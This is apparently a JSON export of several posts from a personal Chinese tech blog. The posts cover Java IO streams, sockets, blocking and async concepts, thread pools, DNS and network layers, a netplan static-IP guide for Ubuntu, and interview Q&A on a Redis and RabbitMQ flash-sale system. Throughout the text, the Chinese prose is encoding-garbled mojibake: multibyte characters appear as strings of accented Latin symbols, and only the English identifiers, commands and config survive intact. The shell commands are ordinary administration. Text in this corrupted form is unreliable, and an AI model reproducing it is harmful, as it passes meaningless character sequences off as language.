·ä¹Ÿæ˜¯ä¸BufferedReaderä¸€ä¸ªåŸç†ï¼Œä¹Ÿéœ€è¦ä¼ å…¥è¿›æœ¬çš„InputStreamè¿›è¡Œå‡çº§ DataInputStreamä¸DataOutputStreamï¼šè¿™ä¿©å°±æ¯”è¾ƒæœ‰æ„æ€äº†ï¼Œç›¸è¾…ç›¸æˆï¼Œä¸javaå†…ç½®çš„åŸºæœ¬æ•°æ®ç±»å‹ç›¸å…³ï¼Œèƒ½å¤Ÿå°†å…¶ä¸­çš„å­—èŠ‚ï¼Œåˆ©ç”¨ä¸€äº›æ–¹æ³•ï¼Œæ¯”å¦‚toLongæˆ–toIntç­‰æ–¹æ³•ç›´æ¥è½¬æ¢ä¸ºjavaçš„åŸºæœ¬æ•°æ®ç±»å‹ 2. è£…é¥°å™¨æ¨¡å¼æˆ‘ä»¬åˆšåˆšçœ‹åˆ°çš„ï¼Œåœ¨å­—ç¬¦æµä¸­BufferedReaderã€InputStreamReaderå’ŒFilterReaderï¼Œå­—èŠ‚æµä¸­çš„BufferedInputStreamã€DataInputStreamReaderä¸DataOutputStreaméƒ½è¿ç”¨åˆ°äº†è£…é¥°å™¨æ¨¡å¼ï¼Œå› ä¸ºå®ƒä»¬æœ¬èº«ä¸èƒ½è¿›è¡Œå®ä¾‹åŒ–ï¼Œéƒ½éœ€è¦ä¼ å…¥åŸºæœ¬çš„Readeræˆ–InputStreamæ¥è¿›è¡Œå‡çº§ï¼Œè¿™é‡Œä¾¿ä½“ç°çš„æ˜¯è£…é¥°å™¨æ¨¡å¼ã€‚ 3. Socket æˆ‘ä»¬å¯ä»¥å°†Socketè®¤ä¸ºæ˜¯ç½‘ç»œä¼ è¾“çš„ç«¯ç‚¹ï¼Œå®ƒä¹Ÿæ˜¯ä¸€ç§æ•°æ®æºï¼Œå°†ç‰¹å®šçš„ipåœ°å€ä¸ç«¯å£å·ä¸å…¶è¿›è¡Œç»‘å®šï¼Œè¿™æ ·å®ƒå°±èƒ½å¤Ÿå®ç°é€šä¿¡çš„åŠŸèƒ½ï¼Œå¦‚ä¸‹å›¾ä¸­ï¼ŒæœåŠ¡å™¨ä¸­çš„socketç»‘å®šäº†å¯¹åº”çš„ipä¸ç«¯å£å·ï¼Œä¸å®¢æˆ·ç«¯é—´è¿›è¡Œé€šä¿¡ 3.1 é€šè¿‡Socketå‘é€æ•°æ®åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° åˆ›å»ºSocketï¼Œç»‘å®šç‰¹å®šçš„ipåœ°å€ä¸ç«¯å£å· å°†Socketä¸ç½‘å¡é©±åŠ¨ç¨‹åºç»‘å®š é€šè¿‡Socketæˆ‘ä»¬å°±èƒ½å¤Ÿå‘é€æ•°æ®äº† ç½‘å¡é©±åŠ¨ç¨‹åºå¯¹Socketæ•°æ®è¿›è¡Œè¯»å– 3.2 é€šè¿‡Socketè¯»å–æ•°æ®åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° ä¸å‘é€æ•°æ®ç±»ä¼¼ï¼Œåªä¸è¿‡æ˜¯å°†è¿™ä¸ªè¿‡ç¨‹åè¿‡æ¥äº† æˆ‘ä»¬è¿˜æ˜¯è¦å…ˆåˆ›å»ºSocket å°†Socketä¸ç½‘å¡é©±åŠ¨ç¨‹åºè¿›è¡Œç»‘å®š Socketæ¥æ”¶æ¥è‡ªç½‘å¡é©±åŠ¨ç¨‹åºçš„æ•°æ® ä»Socketä¸­è¯»å–æ•°æ® 4. åŒæ­¥å¼‚æ­¥ä¸é˜»å¡éé˜»å¡çš„æ¦‚å¿µå®ƒä»¬æœ‰ä¸¤ä¸¤ç»„åˆçš„å››ç§ä¸åŒçš„æ’åˆ—ç»„åˆï¼ŒåŒæ­¥ä¸å¼‚æ­¥å¼ºè°ƒé€šä¿¡æœºåˆ¶ï¼Œé€šä¿—ç‚¹å„¿è¯´å¯ä»¥æ˜¯å…³äºååº”è€…çš„æ¦‚å¿µï¼›é˜»å¡ä¸éé˜»å¡å¼ºè°ƒè°ƒç”¨çŠ¶æ€ï¼Œæˆ‘ä»¬å¯ä»¥å°†å…¶ç†è§£ä¸ºè°ƒç”¨è€…æˆ–è€…è¯·æ±‚å‘èµ·è€… 4.1 åŒæ­¥ï¼ˆå¥³å­©ï¼‰ç”·å­©å‘å¥³å­©è¡¨ç™½ï¼Œå¥³å­©ç«‹å³å¯¹è¯¥äº‹ä»¶è¿›è¡Œæ€è€ƒã€ååº”ï¼Œè¿™å°±æ˜¯åŒæ­¥é€šä¿¡æœºåˆ¶ 4.2 å¼‚æ­¥ï¼ˆå¥³å­©ï¼‰å¼‚æ­¥é€šä¿¡æœºåˆ¶å°±æ˜¯ï¼Œå¥³å­©ä¸ä¼šå¯¹ç”·å­©çš„è¯·æ±‚ç«‹å³å“åº”ï¼Œè€Œæ˜¯å¥³å­©å…ˆå»è€ƒè™‘è€ƒè™‘ï¼Œæœ‰ç»“æœäº†å‘¢ï¼Œæˆ‘å‘çŸ­ä¿¡ç»™ä½  4.3 é˜»å¡ï¼ˆç”·å­©ï¼‰ç”·å­©æ˜¯ä¸ªç“œçš®ï¼Œè‡ªåŠ¨å¯¹å¥³å­©è¡¨ç™½äº†ä»¥åï¼ŒèŒ¶ä¸æ€é¥­ä¸æƒ³ï¼Œä¸€ç›´ç­‰å¾…ç€å¥³å­©çš„å›åº”ï¼Œä¸åšå…¶ä»–çš„äº‹æƒ… 4.4 éé˜»å¡ï¼ˆç”·å­©ï¼‰è¿™ç§ç”·ç”Ÿå°±æ¯”è¾ƒå‰å®³äº†ï¼Œèƒ½å¤Ÿåè°ƒå¥½ç”Ÿæ´»å’Œçˆ±æƒ…ï¼Œå’Œå¥³å­©è¡¨ç™½åï¼Œä¸å¯¹ç»“æœå›°æƒ‘ï¼Œè€Œæ˜¯è¯¥å¹²å•¥è¿˜å»å¹²å•¥ï¼Œè¿™å°±æ˜¯éé˜»å¡è°ƒç”¨ 4.5 å››ç§æ’åˆ—ç»„åˆ åŒæ­¥é˜»å¡ç”·å­©è¡¨ç™½åï¼Œå¥³å­©ç«‹å³è¿›è¡Œæ€è€ƒç»™å‡ºååº”ï¼Œç”·å­©åœ¨è¯¥è¿‡ç¨‹ä¸­å‚»ç­‰ï¼Œä¸å¹²åˆ«çš„ å¼‚æ­¥é˜»å¡ç”·å­©è¡¨ç™½åï¼Œå¥³å­©æºœäº†ï¼Œå›å®¶å»æƒ³æ€ä¹ˆå›åº”äº†ï¼Œä¸ç«‹å³æ€è€ƒï¼Œç”·å­©å‚»ç­‰ï¼Œä¸å¹²åˆ«çš„ åŒæ­¥éé˜»å¡ç”·å­©è¡¨ç™½åï¼Œç”·å­©å¹²åˆ«çš„å»äº†ï¼Œä¸ç­‰ä½ å›å¤ï¼Œè€Œå¥³å­©ç«‹å³é™·å…¥äº†æ²‰æ€ï¼Œæƒ³ç€ååº”ç»“æœ å¼‚æ­¥éé˜»å¡ä¸¤ä¸ªäººéƒ½æ¯”è¾ƒæƒ³å¾—å¼€ï¼Œç”·å­©è¡¨ç™½å®Œï¼Œå¹²åˆ«çš„å»äº†ï¼Œå¥³å­©ä¹Ÿä¸ç«‹å³è€ƒè™‘è¿™ä»¶äº‹æƒ…ï¼Œç­‰å•¥æ—¶å€™è€ƒè™‘å¥½äº†ï¼Œå†å‘æ¶ˆæ¯ç»™ç”·å­© åŒæ­¥é˜»å¡ã€åŒæ­¥éé˜»å¡ã€å¼‚æ­¥é˜»å¡ã€å¼‚æ­¥éé˜»å¡ 5. ç½‘ç»œé€šä¿¡ä¸­çš„çº¿ç¨‹æ± æˆ‘ä»¬åœ¨å¤„ç†é«˜å¹¶å‘è¯·æ±‚çš„æ—¶å€™ï¼Œè‹¥é‡‡ç”¨å¦‚ä¸‹æ–¹æ³•ï¼Œå°†ä¼šé€ æˆå¾ˆå¤§çš„èµ„æºæµªè´¹ çº¿ç¨‹æ± çš„ä½¿ç”¨æ˜¯ä¸ºäº†é¿å…è¿™ç§æƒ…å†µï¼ŒèŠ‚çœç³»ç»Ÿçš„èµ„æº 5.1 javaæä¾›çš„çº¿ç¨‹æ± æˆ‘ä»¬å¯ä»¥åˆ©ç”¨Runnableä¸Callableæ¥åˆ›å»ºä»»åŠ¡ï¼Œåˆ©ç”¨çº¿ç¨‹æ± ä¸­çš„çº¿ç¨‹å»æ‰§è¡Œä»»åŠ¡ï¼Œæœ€åè·å¾—ç»“æœ 5.2 javaåˆ›å»ºçº¿ç¨‹æ± çš„é™æ€æ–¹æ³•åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° newSingleThreadExecutorï¼šè¿™ä¸ªçº¿ç¨‹æ± ä¸­åªæœ‰ä¸€ä¸ªçº¿ç¨‹ï¼Œæˆ‘ä»¬å¯¹è¿™ä¸€ä¸ªçº¿ç¨‹è¿›è¡Œä¸æ–­çš„å¤ç”¨ newFixedThreadPoolï¼šå›ºå®šçº¿ç¨‹æ•°é‡çš„çº¿ç¨‹æ± ï¼Œå½“è¶…è¿‡çº¿ç¨‹å®¹é‡çš„æ—¶å€™ï¼Œè¦è¿›è¡Œç­‰å¾… newCachedThreadPoolï¼šè¿™ä¸ªçº¿ç¨‹æ± å¯¹å¤šå‡ºçš„ä»»åŠ¡ï¼Œè¿˜ä¼šåˆ›å»ºå‡ºæ–°çš„çº¿ç¨‹å»å¯¹å…¶è¿›è¡Œæ‰§è¡Œ newScheduledThreadPoolï¼šèƒ½å¤Ÿå®ç°å®šæ—¶å¤„ç†ä»»åŠ¡çš„çº¿ç¨‹æ± ","categories":[],"tags":[{"name":"network","slug":"network","permalink":"https://blog.kayleh.top/tags/network/"}]},{"title":"Java network programming","slug":"Javaç½‘ç»œç¼–ç¨‹","date":"2020-12-03T09:35:35.000Z","updated":"2021-04-11T17:11:28.234Z","comments":true,"path":"Javaç½‘ç»œç¼–ç¨‹/","link":"","permalink":"https://blog.kayleh.top/Java%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/","excerpt":"","text":"@æ¥æºCSDNï¼šæ–¹åœ†1. URLåœ°å€çš„æ„é€ å’Œè§£ææˆ‘ä»¬çœ‹å¦‚ä¸Šåœ°å€ï¼Œä¸€èˆ¬æƒ…å†µä¸‹.rootæ ¹åŸŸåçš„éƒ¨åˆ†ä¼šè¢«çœç•¥ã€‚è€ŒURLçš„è§£æè¿‡ç¨‹å°±æ˜¯ä»å³å‘å·¦è¿›è¡Œè§£æï¼Œå°†åœ°å€è½¬æ¢ä¸ºIPåœ°å€ï¼Œè¿›è¡Œè®¿é—®ã€‚ 1.1 åŸŸåçš„å±‚çº§åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° 1.2 åŸŸåDNSæŸ¥è¯¢çš„ä¸¤ç§æ–¹å¼1.2.1 é€’å½’æŸ¥è¯¢åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° å¦‚å›¾ä¸Šæ‰€ç¤ºï¼Œæµè§ˆå™¨å°†è¯·æ±‚å‘é€ç»™DNSå®¢æˆ·ç«¯ï¼Œå®¢æˆ·ç«¯è¯·æ±‚æ ¹åŸŸåæœåŠ¡å™¨å¯¹åŸŸåè¿›è¡Œè§£æï¼Œè§£æå®Œæˆåï¼Œéšåå†è®¿é—®é¡¶çº§åŸŸåæœåŠ¡å™¨ï¼Œè¯·æ±‚å®ƒå¯¹åŸŸåè¿›è¡Œè§£æï¼Œä»¥æ­¤ç±»æ¨ï¼Œç›´è‡³å…¨éƒ¨è§£æå®Œæ¯•ï¼Œé‡æ–°ä»ä¸‰çº§åŸŸåæœåŠ¡å™¨ä¸€å±‚ä¸€å±‚ä¼ é€’ç»™DNSå®¢æˆ·ç«¯ï¼Œå†å‘é€ç»™æµè§ˆå™¨ã€‚ 1.2.2 è¿­ä»£æŸ¥è¯¢åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° è¿­ä»£æŸ¥è¯¢æ˜¯è®¿é—®DNSå®¢æˆ·ç«¯åï¼Œå…ˆè®¿é—®æ ¹åŸŸåæœåŠ¡å™¨ï¼Œå°†æ ¹åŸŸåæœåŠ¡å™¨ä¸­å­˜å‚¨çš„è¯¥åŸŸåçš„å†…å®¹å…¨éƒ¨å‘é€ç»™DNSå®¢æˆ·ç«¯ï¼Œå¦‚æœæ— æ³•å®ç°åŸŸåè§£æçš„è¯ï¼ŒDNSå®¢æˆ·ç«¯ä¼šå†æ¬¡è¯·æ±‚é¡¶çº§åŸŸåæœåŠ¡å™¨ï¼Œè¿‡ç¨‹ä¹ŸåŒä¸Šï¼Œæœ€ç»ˆå®Œæˆè§£æåï¼Œå†å°†è¯·æ±‚ç»“æœä¼ é€’ç»™æµè§ˆå™¨ã€‚ Tip: åœ¨å¯¹åŸŸåè¿›è¡Œè§£æè¿‡ä¸€æ¬¡åï¼Œå°±ä¼šäº§ç”Ÿå®ƒçš„ç¼“å­˜ï¼Œå­˜åœ¨DNSå®¢æˆ·ç«¯ä¸­ï¼Œå½“å†æ¬¡è®¿é—®è¯¥åŸŸåæ—¶ï¼Œå°±ä¸ä¼šå†å»è¯·æ±‚å„ä¸ªåŸŸåæœåŠ¡å™¨äº†ã€‚å¯¹äºæ ¹åŸŸåæœåŠ¡å™¨ï¼Œåœ¨å…¨çƒæ˜¯é™é‡çš„ï¼Œå®ƒå·²ç»è¢«å†…ç½®åœ¨DNSå®¢æˆ·ç«¯ä¸­äº†ï¼Œä¸å¿…æ‹…å¿ƒä¸çŸ¥é“æ ¹åŸŸåæœåŠ¡å™¨åœ°å€çš„é—®é¢˜ã€‚ 2. ç½‘ç»œåè®®çš„åŸºç¡€çŸ¥è¯†2.1 åˆ†å±‚åŠåè®®åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° åº”ç”¨å±‚ï¼šè§„å®šåº”ç”¨ç¨‹åºçš„æ•°æ®æ ¼å¼ ä¼ è¾“å±‚ï¼šç«¯å£ä¹‹é—´çš„è¿æ¥ ç½‘ç»œå±‚ï¼šä¸»æœºä¹‹é—´çš„è¿æ¥ï¼Œèƒ½å¤Ÿå®ç°å…·ä½“çš„å®šä½ é“¾è·¯å±‚ï¼šç½‘å¡ä¹‹é—´çš„è¿æ¥ï¼Œæ¯ä¸ªç½‘å¡éƒ½æœ‰è‡ªå·±çš„MACåœ°å€ï¼Œåœ¨ç½‘å¡ç”Ÿäº§å‡ºæ¥çš„æ—¶å€™å°±å·²ç»ç¡®å®šäº†ï¼›å‡å¦‚é€šè¿‡MACåœ°å€ä¼ é€’æ•°æ®ï¼Œé‚£ä¹ˆå®ƒä¼šç»™æ‰€æœ‰å­ç½‘ç»œä¸»æœºéƒ½å‘é€ä¸€ä»½æ•°æ®ï¼Œå¹¶åœ¨æ¥æ”¶æ—¶å°†MACåœ°å€è¿›è¡Œæ ¸å¯¹ï¼Œä¸€è‡´æ—¶æ‰è¿›è¡Œæ¥å—ï¼Œä¸èƒ½å®ç°å‡†ç¡®çš„å®šä½ å®ä½“å±‚ï¼šè§£å†³çš„æ˜¯è®¡ç®—æœºä¹‹é—´çš„è¿æ¥ï¼Œä¸€èˆ¬é€šè¿‡å…‰ç¼†è¿›è¡Œè¿æ¥ 2.2 å„å±‚çš„æ•°æ®åŒ…æ ¼å¼ä»åº”ç”¨å±‚å‘ä¸‹ï¼Œæ¯ç»è¿‡ä¸€å±‚éƒ½ä¼šè¢«æ·»åŠ ä¸Šè¯¥å±‚çš„æ ‡å¤´ï¼Œå¯¹äºEthernetæ ‡å¤´ï¼Œå®ƒçš„å¤§å°ä¸º18ä¸ªå­—èŠ‚ï¼Œå…¶ä½™æ•°æ®éƒ¨åˆ†ä¸º1500å­—èŠ‚ï¼Œå®ƒçš„å¤§å°æœ€å¤§ä¸º1518å­—èŠ‚ï¼Œå³æ¯ä¸ªå¸§çš„å­—èŠ‚ï¼Œå½“å‘é€è¾ƒå¤§çš„æ–‡ä»¶æ—¶ï¼Œå°±ä¼šå‘é€å¤šä¸ªå¸§çš„æ•°æ®åŒ…ï¼Œé€šè¿‡æ ‡å¤´ä¿¡æ¯ï¼Œåœ¨æ¥æ”¶æ—¶èƒ½å¤Ÿå°†å…¶ç»„åˆï¼Œå®ç°æ•°æ®çš„æ­£ç¡®å‘é€ã€‚","categories":[],"tags":[{"name":"network","slug":"network","permalink":"https://blog.kayleh.top/tags/network/"}]},{"title":"ubuntu fixed IP setting method","slug":"ubuntuå›ºå®šIPè®¾ç½®æ–¹æ³•","date":"2020-11-13T07:23:35.000Z","updated":"2021-04-11T17:11:28.533Z","comments":true,"path":"ubuntuå›ºå®šIPè®¾ç½®æ–¹æ³•/","link":"","permalink":"https://blog.kayleh.top/ubuntu%E5%9B%BA%E5%AE%9AIP%E8%AE%BE%E7%BD%AE%E6%96%B9%E6%B3%95/","excerpt":"","text":"ubuntuå›ºå®šIPè®¾ç½®æ–¹æ³•ç¡®è®¤ä½ è¦ä¿®æ”¹çš„ç½‘å¡å·å…ˆç¡®è®¤ä½ è¦ä¿®æ”¹çš„ç½‘å¡å·ï¼Œå‡è®¾ä½ çš„æœåŠ¡å™¨æœ‰å¤šå¼ ç½‘å¡ï¼š `ubuntu1804:~$ ip addr` æˆ‘çš„æœåŠ¡å™¨é…ç½®å¦‚ä¸‹ï¼š `1: lo: mtu 65536 qdisc noqueue state UNKNOWN ``group` `default` `qlen 1000``link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00``inet 127.0.0.1/8 scope host lo``valid_lft forever preferred_lft forever``inet6 ::1/128 scope host``valid_lft forever preferred_lft forever``2: ens33: mtu 1500 qdisc fq_codel state UP ``group` `default` `qlen 1000``link/ether 00:0c:29:f1:b5:e1 brd ff:ff:ff:ff:ff:ff``inet 172.16.87.140/24 brd 172.16.87.255 scope global dynamic ens33``valid_lft 1500sec preferred_lft 1500sec``inet6 fe80::20c:29ff:fef1:b5e1/64 scope link``valid_lft forever preferred_lft forever` img 3. é»˜è®¤çš„ç½‘å¡é…ç½®æ–‡ä»¶é»˜è®¤æƒ…å†µä¸‹ï¼Œç½‘ç»œä½¿ç”¨DHCP `ubuntu1804:~$ cat /etc/netplan/50-cloud-init.yaml``é…ç½®æ–‡ä»¶å†…å®¹å¦‚ä¸‹` `network:`` ``ethernets:`` ``ens33:`` ``dhcp4: yes`` ``addresses: []` ` ``version: 2` 4. è®¾ç½®é™æ€IPéœ€è¦æŠŠé…ç½®æ–‡ä»¶ä¿®æ”¹ä¸ºä»¥ä¸‹å†…å®¹ï¼š `ubuntu1804:~$ sudo vi /etc/netplan/50-cloud-init.yaml` å‡è®¾IPåœ°å€ä¿®æ”¹ä¸º192.168.1.100ï¼Œå­ç½‘æ©ç 24ä½å³255.255.255.0ï¼Œç½‘å…³è®¾ç½®ä¸º192.168.1.1ï¼ŒDNS1ï¼š223.5.5.5ï¼ŒDNS2ï¼š223.6.6.6 `network:`` ``ethernets:`` ``ens33:`` ``dhcp4: no`` ``addresses: [192.168.1.100/24]`` ``optional: ``true`` ``gateway4: 192.168.1.1`` ``nameservers:`` ``addresses: [223.5.5.5,223.6.6.6]` ` ``version: 2` img 5. åº”ç”¨æ–°é…ç½®`ubuntu1804:~$ sudo netplan apply` ä½¿ç”¨ip addræ£€æŸ¥æ–°åœ°å€ `ubuntu1804:~$ ip addr` img 6. æµ‹è¯•ç½‘ç»œè¿é€šæ€§ubuntu1804:~$ ping 192.168.1.100 img","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://blog.kayleh.top/tags/linux/"}]},{"title":"Javaé«˜æ€§èƒ½é«˜å¹¶å‘ç§’æ€ç³»ç»Ÿ(10)","slug":"Javaé«˜æ€§èƒ½é«˜å¹¶å‘ç§’æ€ç³»ç»Ÿ - å‰¯æœ¬ (10)","date":"2020-11-11T04:15:45.000Z","updated":"2021-04-11T17:11:28.237Z","comments":true,"path":"Javaé«˜æ€§èƒ½é«˜å¹¶å‘ç§’æ€ç³»ç»Ÿ - å‰¯æœ¬ (10)/","link":"","permalink":"https://blog.kayleh.top/Java%E9%AB%98%E6%80%A7%E8%83%BD%E9%AB%98%E5%B9%B6%E5%8F%91%E7%A7%92%E6%9D%80%E7%B3%BB%E7%BB%9F%20-%20%E5%89%AF%E6%9C%AC%20(10)/","excerpt":"","text":"1. åº“å­˜é¢„åŠ è½½åˆ°Redisä¸­æ˜¯æ€ä¹ˆå®ç°çš„ï¼Ÿæˆ‘æ˜¯é€šè¿‡å®ç°InitializingBeanæ¥å£ï¼Œé‡å†™å…¶ä¸­afterPropertiesSet()æ–¹æ³•ï¼Œå®ç°çš„é¢„åŠ è½½ 1.1 ä¹‹åä¸»åŠ¨æ·»åŠ ç§’æ€å•†å“çš„è¯ï¼Œæ€ä¹ˆæ·»åŠ ï¼Ÿé€šè¿‡åå°ç®¡ç†è¿›è¡Œæ·»åŠ ï¼Œä¿®æ”¹redisç¼“å­˜å’Œæ•°æ®åº“ä¸­çš„å€¼ 2. åœ¨Redisä¸­æ‰£å‡åº“å­˜çš„æ—¶å€™ï¼Œæ˜¯æ€ä¹ˆä¿è¯çº¿ç¨‹å®‰å…¨ï¼Œé˜²æ­¢è¶…å–çš„ï¼Ÿredisä¸­æœ‰ä¸€ä¸ªdecr()æ–¹æ³•ï¼Œå®ƒå®ç°çš„æ˜¯é€’å‡æ“ä½œï¼Œè€Œä¸”èƒ½å¤Ÿä¿è¯åŸå­æ€§ 3. å¦‚æœå‡ºç°Redisç¼“å­˜é›ªå´©ã€ç©¿é€ï¼Œæ€ä¹ˆè§£å†³ï¼Ÿé›ªå´©å°±æ˜¯ç¼“å­˜ä¸­æˆ‘å­˜å‚¨çš„å€¼å…¨éƒ¨éƒ½å¤±æ•ˆäº†ï¼Œè¯·æ±‚ç›´æ¥æ‰“åˆ°æ•°æ®åº“ä¸Šï¼Œè¯·æ±‚è¿‡å¤§ï¼Œæ•°æ®åº“æ‰›ä¸ä½ã€‚å¯ä»¥ç”¨è®¾ç½®è¿™äº›çƒ­ç‚¹æ•°æ®æ°¸ä¸å¤±æ•ˆï¼Œæˆ–è€…æ˜¯è®¾ç½®ä¸€ä¸ªéšæœºçš„è¿‡æœŸæ—¶é—´ï¼Œè¿™æ ·æ¥é¿å…å®ƒåŒæ—¶å¤±æ•ˆã€‚ ç¼“å­˜ç©¿é€æ˜¯ç¼“å­˜å’Œæ•°æ®åº“ä¸­éƒ½æ²¡æœ‰çš„æ•°æ®ï¼Œå¦‚æœæœ‰äººåˆ©ç”¨è¿™äº›æ•°æ®é«˜å¹¶å‘çš„è®¿é—®çš„è¯ï¼Œå¯¹æ•°æ®åº“å‹åŠ›ä¹Ÿå¾ˆå¤§ã€‚å¯ä»¥å¯¹æ•°æ®æ¯”å¦‚å®ƒçš„idå€¼è¿›è¡Œä¸€ä¸ªæ ¡éªŒï¼Œé¿å…è¿™äº›ä¸å­˜åœ¨çš„å€¼å¯¹æ•°æ®åº“è¿›è¡Œè®¿é—®æˆ–è€…æ˜¯ä½¿ç”¨å¸ƒéš†è¿‡æ»¤å™¨ï¼Œå®ƒçš„åŸç†æ˜¯é€šè¿‡é«˜æ•ˆçš„æ•°æ®ç»“æ„æŸ¥è¯¢æ•°æ®åº“ä¸­æ˜¯å¦å­˜åœ¨è¿™ä¸ªå€¼ï¼Œä¸å­˜åœ¨çš„æ—¶å€™ï¼Œå°±ç›´æ¥è¿”å›ï¼Œå­˜åœ¨çš„è¯æ‰ä¼šè®¿é—®åˆ°æ•°æ®åº“ã€‚ 4. é™æµé˜²åˆ·æ˜¯æ€ä¹ˆå®ç°çš„ï¼Ÿé™æµé˜²åˆ·æˆ‘æ˜¯é€šè¿‡æ‹¦æˆªå™¨æ¥å®ç°çš„ï¼Œæˆ‘è‡ªå®šä¹‰äº†ä¸€ä¸ªæ³¨è§£ï¼Œå®ƒå®ç°çš„åŠŸèƒ½å°±æ˜¯æ ‡è®°åœ¨æ–¹æ³•ä¸Šï¼Œè§„å®šå®ƒå•ä½æ—¶é—´å†…çš„è®¿é—®æ¬¡æ•°ï¼Œå¦‚æœè¶…è¿‡è¦æ±‚çš„è¯ï¼Œå°±ä¼šè¢«æ‹¦æˆªã€‚ æ‹¦æˆªå™¨æˆ‘æ˜¯ç»§æ‰¿çš„HandlerInterceptorAdapterï¼Œé‡å†™çš„æ˜¯preHandleæ–¹æ³•ï¼Œåœ¨è¯¥æ–¹æ³•ä¸­ï¼Œå°†è®¿é—®æ¬¡æ•°åŒæ­¥åˆ°Redisä¸­ï¼Œè¿™ä¸ªé”®å€¼å¯¹æ˜¯å­˜åœ¨æœ‰æ•ˆæœŸçš„ã€‚æœ€åè¿˜è¦æŠŠæ‹¦æˆªå™¨é…ç½®åˆ°é¡¹ç›®ä¸­ï¼Œç»§æ‰¿WebMvcConfigurerAdapterï¼Œé‡å†™addInterceptors()æ–¹æ³• 5. å¯¹äºç”¨æˆ·çš„æ¶æ„ä¸‹å•ï¼Œä»–çŸ¥é“äº†ä½ çš„URLåœ°å€ï¼Œä¸åœçš„åˆ·ï¼Œæ€ä¹ˆåŠï¼Ÿæˆ‘æ˜¯é€šè¿‡éšè—URLåœ°å€æ¥é¿å…è¿™ç§é—®é¢˜çš„ï¼Œå½“è®¿é—®ç§’æ€æ¥å£çš„æ—¶å€™ï¼Œä¼šå…ˆä»åç«¯ç”Ÿæˆä¸€ä¸ªéšæœºçš„å­—ç¬¦ä¸²ï¼Œç„¶åä¿å­˜åˆ°redisä¸­ï¼Œå¹¶ä¸”æ‹¼æ¥åˆ°URLåœ°å€ä¸Šï¼Œè¿™æ ·å†å»è®¿é—®ç§’æ€çš„æ¥å£ï¼Œé€šè¿‡RestFulé£æ ¼çš„åœ°å€ï¼Œè·å–å…¶ä¸­çš„éšæœºå­—ç¬¦ä¸²ï¼Œä¸redisä¸­çš„è¿›è¡Œæ¯”å¯¹ï¼Œä¸€è‡´çš„è¯ï¼Œæ‰èƒ½ç»§ç»­å‘ä¸‹è®¿é—® 6. ç§’æ€æˆåŠŸåæ˜¯æ€ä¹ˆåŒæ­¥åˆ°æ•°æ®åº“ä¸­çš„ï¼Ÿé€šè¿‡ä¸¤æ­¥ï¼Œä¸€æ­¥æ˜¯å‡å°‘å•†å“åº“å­˜ï¼Œç¬¬äºŒæ­¥æ˜¯åˆ›å»ºç§’æ€è®¢å•ã€‚ 6.1 å‡åº“å­˜æˆåŠŸï¼Œåˆ›å»ºç§’æ€è®¢å•å¤±è´¥äº†æ€ä¹ˆåŠï¼Ÿè¿™ä¸¤æ­¥è¿‡ç¨‹åœ¨ä¸€ä¸ªäº‹åŠ¡ä¸­æ‰§è¡Œï¼Œç„¶åå…ˆå‡å°‘åº“å­˜ï¼Œå®ƒæœ‰ä¸€ä¸ªæˆåŠŸçš„æ ‡å¿—ï¼Œå‡å°‘åº“å­˜æˆåŠŸäº†ï¼Œæ‰å»æ‰§è¡Œåˆ›å»ºè®¢å•çš„æ“ä½œ 6.2 Springé»˜è®¤çš„äº‹åŠ¡éš”ç¦»çº§åˆ«é»˜è®¤æƒ…å†µä¸‹Springä½¿ç”¨çš„æ˜¯æ•°æ®åº“è®¾ç½®çš„é»˜è®¤éš”ç¦»çº§åˆ«ï¼Œåº”è¯¥æ˜¯å¯é‡å¤è¯» 7. RabbitMQæ€ä¹ˆæé«˜æ¶ˆæ¯çš„é«˜å¯ç”¨ï¼Ÿæˆ‘åœ¨åˆ›å»ºé˜Ÿåˆ—å®ä¾‹çš„æ—¶å€™ï¼Œå°†å…¶åˆ›å»ºä¸ºå¯æŒä¹…åŒ–çš„ï¼Œå®ƒæœ‰ä¸€ä¸ªdurableå±æ€§è®¾ç½®ä¸ºtrueï¼Œè¿™æ ·ï¼ŒRabbitMQæœåŠ¡é‡å¯çš„æƒ…å†µä¸‹ï¼Œä¹Ÿä¸ä¼šä¸¢å¤±æ¶ˆæ¯ã€‚ 8. è¯´è¯´volatileå…³é”®å­—å„¿å®ƒæœ€é‡è¦çš„ä¸€ç‚¹å°±æ˜¯ä¿è¯äº†å˜é‡çš„å¯è§æ€§ã€‚æˆ‘æƒ³å…ˆè¯´è¯´JMMï¼ˆjavaå†…å­˜æ¨¡å‹ï¼‰ï¼Œæ¯ä¸ªçº¿ç¨‹æœ‰è‡ªå·±çš„å·¥ä½œå†…å­˜ï¼Œå¦å¤–è¿˜å­˜åœ¨ä¸€ä¸ªä¸»å†…å­˜ï¼Œçº¿ç¨‹ä»ä¸»å†…å­˜ä¸­è·å–å€¼å­˜å‚¨åœ¨è‡ªå·±çš„å·¥ä½œå†…å­˜ä¸­ï¼Œå½“å¯¹å˜é‡è¿›è¡Œä¿®æ”¹ï¼Œå®ƒä¸ä¼šç«‹å³å°†å…¶åŒæ­¥åˆ°ä¸»å†…ä¸­ï¼Œè¿™ä¸ªæ—¶å€™è‹¥æœ‰å…¶ä»–çº¿ç¨‹æ¥ä»ä¸»å†…å­˜ä¸­è·å–è¯¥å˜é‡çš„æ—¶å€™ï¼Œå°±ä¼šå‘ç”Ÿè„è¯»çš„ç°è±¡ï¼Œè‹¥è¢«volatileæ ‡è®°çš„è¯ï¼Œå°±èƒ½ä¿è¯å˜é‡çš„å¯è§æ€§ï¼Œå½“å˜é‡è¢«ä¿®æ”¹çš„æ—¶å€™ä»–å°±ä¼šå°†å…¶ç«‹å³åŒæ­¥åˆ°ä¸»å†…å­˜ä¸­ã€‚ 9. TCPå’ŒUDPçš„åŒºåˆ« TCPæ˜¯éœ€è¦é€šè¿‡ä¸‰æ¬¡æ¡æ‰‹å»ºç«‹è¿æ¥çš„ï¼›UDPæ˜¯æ— è¿æ¥çš„ TCPæä¾›çš„å¯é æ€§é«˜ï¼›UDPçš„ä¸ä¿è¯å¯é 